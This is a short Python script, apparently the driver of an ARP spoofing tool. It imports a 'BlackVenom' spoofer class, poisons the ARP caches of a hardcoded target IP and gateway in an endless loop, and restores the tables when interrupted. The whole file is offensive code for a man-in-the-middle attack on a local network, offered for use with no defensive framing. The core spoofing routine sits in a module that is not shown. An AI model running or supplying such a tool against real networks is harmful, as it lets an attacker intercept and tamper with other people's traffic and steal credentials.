import time

from spoofer import BlackVenom


def main():
    """
    Main function to execute ARP spoofing.

    The script will keep spoofing until interrupted (Ctrl+C).
    Once interrupted, it will restore the ARP tables of the affected devices.
    """
    spoofer = BlackVenom()

    target_ip = "192.168.11.128"
    gateway_ip = "192.168.11.2"

    try:
        while True:
            spoofer.spoof(target_ip, gateway_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping ARP Spoofing. Restoring the network...")
        spoofer.restore(target_ip, gateway_ip)

if __name__ == "__main__":
    main()